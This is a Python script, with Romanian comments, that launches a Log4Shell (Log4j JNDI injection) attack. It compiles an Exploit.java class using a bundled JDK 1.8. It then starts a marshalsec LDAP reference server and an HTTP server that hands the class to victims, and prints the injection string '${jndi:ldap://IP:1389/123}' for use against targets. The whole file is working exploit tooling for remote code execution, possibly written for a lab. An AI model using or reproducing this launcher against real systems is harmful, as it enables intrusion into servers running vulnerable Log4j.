import argparse
import subprocess
import threading
from pathlib import Path
import os
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer


def compile_exploit(decision):
    
    if decision == 1:
        p = Path("Exploit.java")
    else:
        p = Path("Exploit2.java")

    try:
        folder_curent = Path(__file__).parent.resolve()
        command = f"{os.path.join(folder_curent, 'jdk1.8.0_20/bin/javac')} {str(p)}"
        print(f"Comanda de compilare: {command}")
        os.system(command)
    except OSError as e:
        print('Compilarea n-a reusit')
        raise e
    else:
        print('Compilarea exploit-ului a reusit')


def start(userip, webport, decision):
    compile_exploit(decision)
    t = threading.Thread(target=lambda: ldap_server(userip, webport, decision))
    print('Server-ul LDAP a pornit')
    t.start()

    httpd = ThreadingHTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    print('Server-ul HTTP a pornit')
    httpd.serve_forever()


def ldap_server(ip, lport, decision):
    exploit_path = "${jndi:ldap://%s:1389/123}" % (ip)
    print(f": String-ul malitios: {exploit_path}\n")

    if decision == 1:
        url = "http://{}:{}/#Exploit".format(ip, lport)
    else:
        url = "http://{}:{}/#Exploit2".format(ip, lport)

    folder_curent = Path(__file__).parent.resolve()
    # necesar pentru a rula serverul LDAP
    subprocess.run([
        os.path.join(folder_curent, "jdk1.8.0_20/bin/java"),
        "-cp",
        os.path.join(folder_curent, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])

parser = argparse.ArgumentParser()
parser.add_argument('--userip',
                    metavar='userip',
                    type=str)

parser.add_argument('--webport',
                    metavar='webport',
                    type=int)

parser.add_argument('--decision',
                    metavar='decision',
                    type=int,
                    default=1)

args = parser.parse_args()

try:
    start(args.userip, args.webport, args.decision)
except KeyboardInterrupt:
    print("CTRL+C detectat")
    raise SystemExit(0)
